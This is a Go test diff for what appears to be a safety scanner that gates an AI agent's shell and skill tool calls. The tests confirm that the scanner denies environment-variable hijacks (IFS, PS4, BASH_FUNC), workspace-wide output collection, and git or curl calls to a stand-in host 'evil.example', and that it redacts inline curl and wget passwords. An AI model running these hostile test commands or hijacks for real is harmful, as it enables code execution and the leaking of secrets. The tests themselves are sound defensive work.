@@ -212,6 +212,15 @@ func TestDefaultScanner_AcceptanceCases(t *testing.T) {
 			blocked: true,
 		},
 		{
+			name: "ambiguous_command_and_args",
+			req: ScanRequest{
+				ToolName: "workspace_exec", Backend: BackendWorkspace,
+				Command: "echo ok", Args: []string{"echo", "still ambiguous"},
+			},
+			decision: DecisionDeny, ruleID: "request.command_args_conflict",
+			blocked: true,
+		},
+		{
 			name: "metadata_output_limit",
 			req: ScanRequest{
 				ToolName: "workspace_exec", Backend: BackendWorkspace,
@@ -327,6 +336,26 @@ func TestDefaultScanner_EnvAllowlistBlocksUnknownEnv(t *testing.T) {
 	require.Equal(t, DecisionDeny, report.Decision)
 	require.Equal(t, "env.process_control", report.RuleID)
 	require.True(t, report.Blocked)
+}
+
+func TestDefaultScanner_ProcessControlEnvironmentMatchesEnvScrub(t *testing.T) {
+	for _, key := range []string{
+		"HOME", "SHELL", "IFS", "PS4", "SHELLOPTS", "BASHOPTS",
+		"PATH=.", "BASH_FUNC_demo()",
+	} {
+		report, err := MustDefaultScanner(Policy{}).Scan(
+			context.Background(),
+			ScanRequest{
+				ToolName: "exec_command",
+				Backend:  BackendHost,
+				Command:  "echo ok",
+				Env:      map[string]string{key: "attacker-controlled"},
+			},
+		)
+		require.NoError(t, err, key)
+		require.Equal(t, DecisionDeny, report.Decision, key)
+		require.Equal(t, "env.process_control", report.RuleID, key)
+	}
 }
 
 func TestDefaultScanner_RejectsUnsupportedBackend(t *testing.T) {
@@ -496,6 +525,22 @@ func TestDefaultScanner_GatesBroadSecretCollectionGlobs(t *testing.T) {
 			CollectionPaths: []string{collectionPath},
 		})
 		require.NoError(t, err)
+		require.Equal(t, DecisionDeny, report.Decision, collectionPath)
+		require.Equal(t, "path.output_collection", report.RuleID, collectionPath)
+	}
+}
+
+func TestDefaultScanner_GatesWorkspaceWideCollectionSelectors(t *testing.T) {
+	for _, collectionPath := range []string{
+		".", "./", "out/..", "$WORKSPACE_DIR", "${WORKSPACE_DIR}/",
+	} {
+		report, err := MustDefaultScanner(Policy{}).Scan(context.Background(), ScanRequest{
+			ToolName:        "skill_run",
+			Backend:         BackendHost,
+			Command:         "true",
+			CollectionPaths: []string{collectionPath},
+		})
+		require.NoError(t, err, collectionPath)
 		require.Equal(t, DecisionDeny, report.Decision, collectionPath)
 		require.Equal(t, "path.output_collection", report.RuleID, collectionPath)
 	}
@@ -854,6 +899,37 @@ func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
 		require.Equal(t, "network.non_allowlisted_domain", report.RuleID)
 	})
 
+	t.Run("network allowlist applies to scp-style git remotes", func(t *testing.T) {
+		cases := []struct {
+			command  string
+			decision Decision
+			ruleID   string
+		}{
+			{
+				command:  "git clone git@evil.example:repo",
+				decision: DecisionDeny,
+				ruleID:   "network.non_allowlisted_domain",
+			},
+			{
+				command:  "git clone git@allowed.example:repo",
+				decision: DecisionAllow,
+				ruleID:   "evaluation.none",
+			},
+		}
+		for _, tc := range cases {
+			report, err := MustDefaultScanner(Policy{
+				NetworkAllowlist: []string{"allowed.example"},
+			}).Scan(context.Background(), ScanRequest{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspace,
+				Command:  tc.command,
+			})
+			require.NoError(t, err, tc.command)
+			require.Equal(t, tc.decision, report.Decision, tc.command)
+			require.Equal(t, tc.ruleID, report.RuleID, tc.command)
+		}
+	})
+
 	t.Run("network allowlist applies to interpreter URL calls", func(t *testing.T) {
 		report, err := MustDefaultScanner(Policy{
 			NetworkAllowlist: []string{"allowed.example"},
@@ -945,6 +1021,10 @@ func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
 			"wget --execute=use_proxy=no https://allowed.example",
 			"wget -e use_proxy=no https://allowed.example",
 			"wget -euse_proxy=no https://allowed.example",
+			"wget -i urls.txt https://allowed.example",
+			"wget -iurls.txt https://allowed.example",
+			"wget --input-file urls.txt https://allowed.example",
+			"wget --input-file=urls.txt https://allowed.example",
 		}
 		for _, command := range commands {
 			report, err := MustDefaultScanner(Policy{
@@ -1018,6 +1098,38 @@ func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
 		require.NotContains(t, report.Command, "alice:password")
 		require.NotContains(t, report.Command, "proxy:password")
 		require.NotContains(t, report.Command, "bearer-token")
+	})
+
+	t.Run("remaining curl and wget credentials use SecretAction and are redacted", func(t *testing.T) {
+		secretAction := DecisionAsk
+		cases := []struct {
+			command string
+			secret  string
+		}{
+			{`curl --pass curl-passphrase https://allowed.example`, "curl-passphrase"},
+			{`curl --pass=curl-passphrase https://allowed.example`, "curl-passphrase"},
+			{`curl --proxy-pass proxy-passphrase https://allowed.example`, "proxy-passphrase"},
+			{`curl --proxy-pass=proxy-passphrase https://allowed.example`, "proxy-passphrase"},
+			{`wget --ftp-password ftp-password-value https://allowed.example`, "ftp-password-value"},
+			{`wget --ftp-password=ftp-password-value https://allowed.example`, "ftp-password-value"},
+			{`wget --proxy-password proxy-password-value https://allowed.example`, "proxy-password-value"},
+			{`wget --password=wget-password-value https://allowed.example`, "wget-password-value"},
+		}
+		for _, tc := range cases {
+			report, err := MustDefaultScanner(Policy{
+				NetworkAllowlist: []string{"allowed.example"},
+				SecretAction:     secretAction,
+			}).Scan(context.Background(), ScanRequest{
+				ToolName: "workspace_exec",
+				Backend:  BackendWorkspace,
+				Command:  tc.command,
+			})
+			require.NoError(t, err, tc.command)
+			require.Equal(t, secretAction, report.Decision, tc.command)
+			require.Equal(t, "secret.inline_value", report.RuleID, tc.command)
+			require.True(t, report.Redacted, tc.command)
+			require.NotContains(t, report.Command, tc.secret, tc.command)
+		}
 	})
 
 	t.Run("ambiguous authentication flags stay allowed for non-network commands", func(t *testing.T) {
@@ -1167,6 +1279,7 @@ func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
 	t.Run("skill execution tools use scanner command rules", func(t *testing.T) {
 		scanner := MustDefaultScanner(Policy{
 			NetworkAllowlist: []string{"proxy.golang.org"},
+			MaxOutputBytes:   256 << 20,
 		})
 		cases := []struct {
 			toolName string
@@ -1176,13 +1289,13 @@ func TestDefaultScanner_NetworkAndCodeEdges(t *testing.T) {
 		}{
 			{
 				toolName: "skill_run",
-				args:     []byte(`{"command":"curl https://evil.example","workdir":"."}`),
+				args:     []byte(`{"command":"curl https://evil.example","workdir":".","output_files":["out/result.txt"]}`),
 				ruleID:   "network.non_allowlisted_domain",
 				decision: DecisionDeny,
 			},
 			{
 				toolName: "skill_exec",
-				args:     []byte(`{"command":"npm install left-pad","cwd":"."}`),
+				args:     []byte(`{"command":"npm install left-pad","cwd":".","output_files":["out/result.txt"]}`),
 				ruleID:   "dependency.install",
 				decision: DecisionAsk,
 			},
